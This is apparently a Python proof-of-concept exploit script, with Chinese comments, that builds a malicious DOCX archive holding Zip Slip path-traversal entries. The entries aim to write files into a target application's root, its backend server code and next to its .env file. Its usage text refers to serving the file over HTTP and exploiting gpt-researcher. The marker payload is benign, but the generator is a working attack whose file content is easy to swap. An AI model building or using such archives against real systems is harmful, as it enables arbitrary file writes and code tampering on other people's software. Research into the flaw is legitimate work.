#!/usr/bin/env python3
"""
创建包含Zip Slip漏洞的恶意DOCX文件
用于安全研究和漏洞验证
"""

import zipfile
import time
import os
from pathlib import Path

def create_zip_slip_docx(output_path="malicious_document.docx"):
    """
    创建包含路径遍历的恶意DOCX文件

    DOCX文件本质上是ZIP归档，包含XML文件
    我们在ZIP中添加带有路径遍历的条目
    """

    print("=" * 70)
    print("Creating Malicious DOCX for Zip Slip Testing")
    print("=" * 70)

    # 创建PWNED标记内容
    timestamp = time.time()
    pwned_content = f"""#!/usr/bin/env python3
#################################################################################
# SECURITY TEST FILE - VULNERABILITY DEMONSTRATION
#################################################################################
#
# This file was created by a security researcher to demonstrate
# the Zip Slip vulnerability in document processing.
#
# If you see this file, it means:
# 1. A malicious DOCX was uploaded/processed
# 2. The ZIP extraction did NOT sanitize file paths
# 3. Files can be written outside the intended directory
#
# Created: {timestamp}
# Time: {time.strftime('%Y-%m-%d %H:%M:%S', time.localtime(timestamp))}
#
# This is NOT malware - it's a proof of concept for security testing.
#################################################################################

import sys

def main():
    print("=" * 70)
    print("ZIP SLIP VULNERABILITY CONFIRMED!")
    print("=" * 70)
    print(f"This file should NOT exist at: {{__file__}}")
    print(f"Created at: {time.strftime('%Y-%m-%d %H:%M:%S', time.localtime(timestamp))}")
    print("=" * 70)

if __name__ == "__main__":
    main()
"""

    # 创建ZIP文件（DOCX格式）
    with zipfile.ZipFile(output_path, 'w', zipfile.ZIP_DEFLATED) as zf:

        # 1. 添加合法的DOCX结构（让文件看起来正常）
        print("\n[*] Adding legitimate DOCX structure...")

        # 最小化的Word文档XML
        word_document = '''<?xml version="1.0" encoding="UTF-8"?>
<w:document
    xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main"
    xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships">
    <w:body>
        <w:p>
            <w:r>
                <w:t>Security Research Document</w:t>
            </w:r>
        </w:p>
        <w:p>
            <w:r>
                <w:t>This document contains test content for vulnerability assessment.</w:t>
            </w:r>
        </w:p>
        <w:p>
            <w:r>
                <w:t>If you are seeing this, a security test is in progress.</w:t>
            </w:r>
        </w:p>
    </w:body>
</w:document>'''

        zf.writestr('word/document.xml', word_document)
        print("    ✓ Added word/document.xml")

        # Content Types定义
        content_types = '''<?xml version="1.0" encoding="UTF-8"?>
<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">
    <Default Extension="xml" ContentType="application/xml"/>
    <Default Extension="rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>
    <Override PartName="/word/document.xml"
              ContentType="application/vnd.openxmlformats-officedocument.wordprocessingml.document.main+xml"/>
</Types>'''

        zf.writestr('[Content_Types].xml', content_types)
        print("    ✓ Added [Content_Types].xml")

        # _rels/.rels (包关系)
        rels = '''<?xml version="1.0" encoding="UTF-8"?>
<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
    <Relationship Id="rId1"
                  Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/officeDocument"
                  Target="word/document.xml"/>
</Relationships>'''

        zf.writestr('_rels/.rels', rels)
        print("    ✓ Added _rels/.rels")

        # 2. 添加恶意路径遍历条目
        print("\n[*] Adding malicious Zip Slip payloads...")

        # 定义路径遍历payload
        # 这些路径会在ZIP解压时尝试写入到父目录
        traversal_payloads = [
            {
                'path': '../outputs/PWNED_outputs.py',
                'desc': 'Escape to outputs directory (should succeed - writable)',
                'risk': 'HIGH'
            },
            {
                'path': '../PWNED_app_root.py',
                'desc': 'Escape to application root',
                'risk': 'CRITICAL'
            },
            {
                'path': '../../my-docs/PWNED_mydocs.py',
                'desc': 'Escape to my-docs directory',
                'risk': 'HIGH'
            },
            {
                'path': '../.env.PWNED_BACKUP',
                'desc': 'Create file next to .env (information disclosure vector)',
                'risk': 'CRITICAL'
            },
            {
                'path': 'word/../../PWNED_relative.py',
                'desc': 'Relative path traversal from word/ directory',
                'risk': 'HIGH'
            },
            {
                'path': '../backend/server/PWNED_server.py',
                'desc': 'Attempt to write into backend code directory',
                'risk': 'CRITICAL'
            },
        ]

        added_count = 0
        for payload in traversal_payloads:
            try:
                # Python's zipfile会允许这些路径，但解压工具的行为不同
                zf.writestr(payload['path'], pwned_content)
                print(f"    ✓ [{payload['risk']}] {payload['path']}")
                print(f"      → {payload['desc']}")
                added_count += 1
            except Exception as e:
                print(f"    ✗ Failed to add {payload['path']}: {e}")

        # 3. 添加一个正常文件作为对照
        zf.writestr('word/LEGITIMATE_FILE.txt', 'This is a normal file without path traversal.')
        print(f"\n    ✓ Added 1 legitimate file for comparison")

    # 验证文件创建
    if os.path.exists(output_path):
        file_size = os.path.getsize(output_path)
        print(f"\n[✓] Malicious DOCX created successfully!")
        print(f"    Path: {os.path.abspath(output_path)}")
        print(f"    Size: {file_size} bytes")
        print(f"    Payloads: {added_count} path traversal entries")

        # 列出ZIP内容以验证
        print(f"\n[*] ZIP Contents Preview:")
        with zipfile.ZipFile(output_path, 'r') as zf:
            for info in zf.filelist:
                # 高亮显示路径遍历条目
                if '..' in info.filename:
                    print(f"    🔴 {info.filename} (SIZE: {info.file_size})")
                else:
                    print(f"    ⚪ {info.filename} (SIZE: {info.file_size})")

        print("\n" + "=" * 70)
        print("USAGE:")
        print("=" * 70)
        print("1. Serve this file via HTTP:")
        print("   python serve_malicious_file.py")
        print("")
        print("2. Test with gpt-researcher:")
        print("   python exploit_via_document_url.py")
        print("")
        print("3. Verify results:")
        print("   bash verify_vulnerability.sh")
        print("=" * 70)

        return output_path
    else:
        print(f"\n[✗] Failed to create {output_path}")
        return None


def inspect_existing_docx(docx_path):
    """检查现有DOCX文件的内容"""
    print(f"\n[*] Inspecting existing DOCX: {docx_path}")
    try:
        with zipfile.ZipFile(docx_path, 'r') as zf:
            print(f"[*] ZIP file contains {len(zf.filelist)} entries:")
            for info in zf.filelist:
                marker = "⚠️ " if '..' in info.filename else "  "
                print(f"{marker}{info.filename} ({info.file_size} bytes)")
    except Exception as e:
        print(f"[✗] Error: {e}")


if __name__ == "__main__":
    import sys

    if len(sys.argv) > 1 and sys.argv[1] == 'inspect':
        # 检查模式
        if len(sys.argv) > 2:
            inspect_existing_docx(sys.argv[2])
        else:
            print("Usage: python create_malicious_docx.py inspect <docx_file>")
    else:
        # 创建模式
        output_file = sys.argv[1] if len(sys.argv) > 1 else "malicious_document.docx"
        create_zip_slip_docx(output_file)
